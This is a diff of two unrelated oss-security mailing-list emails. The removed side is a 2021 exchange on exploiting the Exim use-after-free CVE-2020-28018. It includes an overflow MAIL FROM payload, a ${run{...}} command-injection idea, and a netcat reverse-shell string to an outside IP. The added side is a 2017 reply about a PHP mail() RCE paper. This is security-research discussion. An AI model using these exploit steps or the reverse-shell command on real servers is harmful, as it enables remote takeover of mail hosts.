@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["5840" "Tuesday" "11" "May" "2021" "23:18:12" "+0200" "null p0int3r" "nullp0int3rx@gmail.com" nil "163" "Re: [oss-security] [CVE-2020-28018] Use-After-Free on Exim Question" nil nil nil "5" nil nil (number mark "U       nullp0int3rx May 11  163/5840  " thread-indent "\"Re: [oss-security] [CVE-2020-28018] Use-After-Free on Exim Question\"\n") nil nil nil nil nil nil nil nil nil "Re: [oss-security] [CVE-2020-28018] Use-After-Free on Exim Question" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1225" "Wednesday" "3" "May" "2017" "16:42:25" "-0500" "Sam Pizzey" "sam@pizzey.me" "<2e47f3de-a154-ff6d-a596-6c7766a96e34@pizzey.me>" "37" "Re: [oss-security] [white-paper] Pwning PHP mail() function For Fun And RCE (ver 1.0)" "^Date:" nil nil "5" "2017050321:42:25" "[oss-security] [white-paper] Pwning PHP mail() function For Fun And RCE (ver 1.0)" (number mark "        sam@pizzey.m May  3   37/1225  " thread-indent "\"Re: [oss-security] [white-paper] Pwning PHP mail() function For Fun And RCE (ver 1.0)\"\n") "<CADSYzstfctEZTo4GKGR-H2WXC3kZRSAj7sj7ZHCAu9C7Ff5BYw@mail.gmail.com>" ("<CADSYzstfctEZTo4GKGR-H2WXC3kZRSAj7sj7ZHCAu9C7Ff5BYw@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0000
+X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 13662 invoked by uid 550); 11 May 2021 21:37:03 -0000
+Received: (qmail 3381 invoked by uid 550); 4 May 2017 06:31:40 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,207 +11,82 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-Received: (qmail 5894 invoked from network); 11 May 2021 21:18:35 -0000
+Received: (qmail 22049 invoked from network); 3 May 2017 21:42:44 -0000
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20161025;
-        h=mime-version:references:in-reply-to:from:date:message-id:subject:to
-         :cc;
-        bh=NNL0nxj8qk6jDEdx/LPN7mxw1gQoaGZLhPZhxzssTX0=;
-        b=lY0avM8yimCkmxsM2kX0l/LoJ1av9g3xJqHqHpQYCgKI20jfdpwt1gqqcDxe66qk5+
-         ADG9P6b402FWy6OCdZAESgd1mf7j3+V8fTXTMmbd6jkmZbke9DFm/jCvWah8JXtz9rkq
-         jcNnLRU4Ac0k5SJCZQ7lJidVYNjhvJ1BsPsyyLRxKm3cy7l8zOZRqm5awU27i4c9SZV4
-         LWdkRqmoep+yKT7CxqSFeUD/1O62tcgSoxjYAomxwW+9gVi56fRMYZqR3HXpx+3J58aX
-         aZ9NNSeBfhB4kh2kWJ5N/x9JIzD6/jTDAqNgBN6vJPl+rFK+thP9EpoBy4NisZQZ7RtC
-         xQng==
+        d=pizzey-me.20150623.gappssmtp.com; s=20150623;
+        h=subject:to:references:from:message-id:date:user-agent:mime-version
+         :in-reply-to:content-transfer-encoding;
+        bh=w82W7JJTmIuZ2/IKY49jd8tZAoOoHpb955MD2uY//AY=;
+        b=CXzKLowuNEI9zim41GZylfiNlLkuoK0Gam9ZAhSckRQcwcs3MeVznDV5p+cA+ArOdu
+         CVdJPSmCvKVodWz9weamTcork0Y/CcJkHjd1FAnT6xL5VsH2PKlcNtohx0XG4DJNyj1g
+         RzUBtQQh8Egjzu5r/3DXqGd869VPZmfWimh+1CGTdVInSgXJLlAd8dHRgi/ZT8PAIMJv
+         ta3C1lQn2XOy1jO6/wdJVgIZye1cDTtS4I6Oq7My0C+pJLULnBWLHBTzM0ZARnQ2IO6q
+         nIxVOwRspo56Flgk22WbbEYvM33QSMrh5uEMEUuAV4iMCysGKT83T4Tw5MPmyENf8LMt
+         BpBg==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
         d=1e100.net; s=20161025;
-        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
-         :message-id:subject:to:cc;
-        bh=NNL0nxj8qk6jDEdx/LPN7mxw1gQoaGZLhPZhxzssTX0=;
-        b=Apf2OzbF8m155YFxK/qTZotMxj85FtW7+p5Ixaou5Th8+2uyMqVVkwuhROFle++60O
-         llsrdpQqK8BO0FHiA9FzMoPeewMpcaJnwJcLPKALEwgXR+SqAC5eH2tBrHpXC35T/sCk
-         q9C772o0/Me5d15L+71oauR9lVlC4CmmDgrKX0PHhlRn4YwZAn0siyftYUvmqq+3zA2q
-         0WHWU4CA8d21QjOKMMwZVWrRy8dRYQDjr9Dle3J5a+t2qvgi5DTWX7bsytD0/n2squBN
-         bdQ3wXfIk3kQlu/XxEcuknwjcRIas9N1OILnRZ/0rj6v+vffP3joznJ67AU4AA8WRkk6
-         yaxQ==
-X-Gm-Message-State: AOAM5313VUPypTijaIGOepfSaU4/R09JCP6v5TyzAKyj6ksmuC9MZ4ri
-	wq+d2Txfpxty66S7IEnEQDN9NZGfWgsV68J4T299HfXr8A==
-X-Google-Smtp-Source: ABdhPJwc1e0IJaL9a5mio0+EtphJNhnMcjBUl9j03zgeD08KH4jZOwaJjVGa5ejn0XutBVpkSiO7AlLM04Hjj7L0mzc=
-X-Received: by 2002:a05:6512:60f:: with SMTP id b15mr21335554lfe.518.1620767903967;
- Tue, 11 May 2021 14:18:23 -0700 (PDT)
+        h=x-gm-message-state:subject:to:references:from:message-id:date
+         :user-agent:mime-version:in-reply-to:content-transfer-encoding;
+        bh=w82W7JJTmIuZ2/IKY49jd8tZAoOoHpb955MD2uY//AY=;
+        b=ZRjy1URoB3yy6LaJHtSThmmtgXmq9AREQ+knfKETlT7T0uH8jILqf9En6lRpfutpYi
+         hUhfgfBM2UWo39w3e+VA80uGq3lEqAi9QA5yPgSyrsHMmond+wcIlSDCEHga/fxhyvgi
+         YqU8J87vjvVI2rtOkIx5dZVX9CTok4r0AnnX1SKIYfqameB96TRBh457NPt8bvuQuWJ4
+         VxyEukKTXzsAnf/wEP6LtzwDOrjuVLQn/w+TeOpRoqijFZq2Lasi5XzrZKfEH0akh78E
+         e6rbgJQCKX8GXOM1VqyHgs33HoncMEizhK0RlwrkROqLybx89jO08jfSC1tE/NoxgEuK
+         alfg==
+X-Gm-Message-State: AN3rC/7vXwO4J/SoRf8RpRTk+6WKCg+h7O7/kJU6f7+DaHM3gODlmtlo
+	uTfnOCEQ53L9PCfI3sY=
+X-Received: by 10.107.136.204 with SMTP id s73mr9672890ioi.224.1493847751762;
+        Wed, 03 May 2017 14:42:31 -0700 (PDT)
+References: <CADSYzstfctEZTo4GKGR-H2WXC3kZRSAj7sj7ZHCAu9C7Ff5BYw@mail.gmail.com>
+Message-ID: <2e47f3de-a154-ff6d-a596-6c7766a96e34@pizzey.me>
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:45.0)
+ Gecko/20100101 Thunderbird/45.8.0
 MIME-Version: 1.0
-References: <CAOni+oNB4JCe+Z=V+_bQGHBJ-HfN0AwVLC_H0qwVBsF0KKEoYQ@mail.gmail.com>
- <20210511205319.GA22017@localhost.localdomain>
-In-Reply-To: <20210511205319.GA22017@localhost.localdomain>
-From: null p0int3r <nullp0int3rx@gmail.com>
-Date: Tue, 11 May 2021 23:18:12 +0200
-Message-ID: <CAOni+oOrTbyTC0szU3yvXKaygs=CB41ENj1kBG44c2d1KbGK3g@mail.gmail.com>
-To: Qualys Security Advisory <qsa@qualys.com>
-Cc: oss-security@lists.openwall.com
-Content-Type: multipart/alternative; boundary="0000000000002ded9505c2146f20"
-Subject: Re: [oss-security] [CVE-2020-28018] Use-After-Free on Exim Question
+In-Reply-To: <CADSYzstfctEZTo4GKGR-H2WXC3kZRSAj7sj7ZHCAu9C7Ff5BYw@mail.gmail.com>
+Content-Type: text/plain; charset=utf-8; format=flowed
+Content-Transfer-Encoding: 7bit
+Date: Wed, 3 May 2017 16:42:25 -0500
+From: Sam Pizzey <sam@pizzey.me>
+Reply-To: oss-security@lists.openwall.com
+Subject: Re: [oss-security] [white-paper] Pwning PHP mail() function For Fun
+ And RCE (ver 1.0)
+To: oss-security@lists.openwall.com
 
---0000000000002ded9505c2146f20
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
+Looks good! Especially the Exim RCE technique which I now need to go 
+play with.
 
-Hi again!
+However:
 
-Thanks for the reply.
+'Also note that the output log file contains a lot of debug information
+added by Sendmail MTA. This might'
 
-In addition to my previous question, to leave it more clear...
+Might ..?
 
-I successfully exploited the Use-After-Free to get Heap Address Leak and
-the arbitrary read primitive mentioned in the advisory.
-
-Talking about the arbitrary read, I sent a "MAIL FROM" command after the
-last "STARTTLS".
-
-When sending it after the STARTTLS (the last one before the UAF), the
-content sent is right next to the gstring freed buffer, something that does
-not happen when on plaintext, as the data is written far away from the
-target struct.
-
-Then sending a MAIL FROM command with any data, allowed me to enter some of
-that data in the gstring freed struct.
-
-So... entering something like: MAIL FROM: <>
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
-AAAAAABBBBCCCCDDDDDDDD
-
-Would end up overwriting the g->size, g->ptr and g->s:
-
-g->size =3D 0x42424242
-g->ptr =3D 0x43434343
-g->s =3D 0x44444444
-
-Finally this will end up on arbitrary read, as having control of the
-gstring struct directly allow me read any address. When using this, the
-same response for that mentioned MAIL FROM command will contain the data
-where g->s points to. So I waste the chance of exploiting the UAF on it
-(but hopefully I can do it without any additional command).
-
-Also, perhaps receiving the "501 NUL characters are not allowed in SMTP
-commands" message, that response is written far away from my struct
-(because g->ptr contains a huge value), so no problem with it.
-
-That does not happen at the time of achieving a write-what-where, as this
-time, I depend on the response of the same command (because after the
-STARTTLS I have only one chance to exploit the UAF, else the pointer will
-be NULLed out).
-
-I though about sending a malformed-domain, so after overwriting the struct,
-part of response would be data I sent, in which a ${run{command}}  could
-exist:
-
-Sample: "501 ${run{command}} is an invalid address blablabla"
-
-This message would be entered where g->s points to.
-
-Unfortunately, the "501 NUL characters are not allowed in SMTP commands"
-message is used as response instead, so it is written into my target
-address instead of the data I want to.
-
-To avoid that message I though too about sending first a huge g->size
-value, then substract the value I use on g->ptr (like 0x01010101 to avoid
-NULLs) to the address I use to replace g->s.
-
-The only constraint of it is that as heap addresses contain at least 2 NULL
-bytes, the last part of the message would need to be the address and a new
-line character which is skipped on write, so if the buffer on that
-positions contain NULL bytes (something that happens as the last pointer
-stored there also contains 2 NULLs at the end as any heap address).
-
-Then if the previous data was:
-
-0x0000beefdeadbeef
-
-And I send: MAIL FROM: <>
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
-AAAAAABBBBCCCCDDDDDD
-+
-<CRLF>
-
-The pointer would end up like this:
-
-0x0000444444444444
-
-In theory it would work but...unfortunately any reverse shell config length
-is higher than the number of characters from where I can start writing to
-the struct (26 bytes).
-
-[ 26-byte length space ] [ gstring struct ] [ ... ]
-^
-|
-|-------------- (start of my controlled buffer)
-
-
-strlen("${{nc -e /bin/sh 123.123.123.123 55555}}") =3D 40
-
-And I cannot add it after the gstring overwrite cause I need no more data
-as I do not want to enter non-NULL data on those two bytes for the address.
-
-So...
-
-How do you overwrite the gstring struct when you are on plaintext, so you
-can then freely send a MAIL FROM after the STARTTLS without facing those
-problems and directly getting it's response on target address previously
-corrupted?
-
-I saw some functions I could use for filling heap until overwriting my
-target, but they are just string-based so no NULL bytes possible.
-
-In the advisory it is mentioned the use of the name=3Dvalue pair, but readi=
-ng
-the code I see just string based functions used for allocations.
-
-Thanks again!
-Hope the question is more clear now
-
-El mar, 11 may 2021 a las 22:55, Qualys Security Advisory (<qsa@qualys.com>)
-escribi=C3=B3:
-
-> Hi,
+On 03/05/2017 15:32, Dawid Golunski wrote:
+> Here's a paper I wrote back in December.  It was originally meant to go
+> into Phrack but the team wanted a more general article on parameter injection
+> as mail() was supposedly an outdated technique.
+> Meanwhile, the RCE-chain continues :) So I decided to post it as it is without
+> changing it as mail() injection deserves a separate article imho.
 >
-> On Tue, May 11, 2021 at 01:23:43PM +0200, null p0int3r wrote:
-> > So I suppose that command is the first you send after the second
-> > "STARTTLS" command being sent right?
+> https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html
 >
-> Yes! After the second STARTTLS we send an invalid MAIL FROM command (for
-> example, "MAIL FROM:(\"${run{...}}\")\n"). Exim then responds with a 501
-> error message that includes our "${run{...}}" string, and since corked
-> in tls_write() is still non-NULL, this string is written to where the
-> used-after-free corked points to.
+> I reveal some exim code-execution vectors in there that should change
+> the whole game slightly :)
 >
-> Hopefully this helps!
->
-> > PD: Congrats for those nice bugs discovered.
->
-> Thank you very much for your mail!
->
-> With best regards,
->
-> --
-> the Qualys Security Advisory team
+> See my exploit for WordPress Core that is based on it:
+> https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html
 >
 >
-> [https://d1dejaj6dcqv24.cloudfront.net/asset/image/email-banner-384-2x.png
-> ]<https://www.qualys.com/email-banner>
+> I'll attach copies of the white-paper here in the next revision as I
+> haven't slept for 3 nights and need to double check on everything
+> before it goes into the archive forever :)
 >
 >
->
-> This message may contain confidential and privileged information. If it
-> has been sent to you in error, please reply to advise the sender of the
-> error and then immediately delete it. If you are not the intended
-> recipient, do not read, copy, disclose or otherwise use this message. The
-> sender disclaims any liability for such unauthorized use. NOTE that all
-> incoming emails sent to Qualys email accounts will be archived and may be
-> scanned by us and/or by external service providers to detect and prevent
-> threats to our systems, investigate illegal or inappropriate behavior,
-> and/or eliminate unsolicited promotional emails (=E2=80=9Cspam=E2=80=9D).=
- If you have any
-> concerns about this process, please contact us.
->
+> Regards,
+> Dawid Golunski
+> https://legalhackers.com
+> https://ExploitBox.io
+> t: @dawid_golunski
 
---0000000000002ded9505c2146f20--
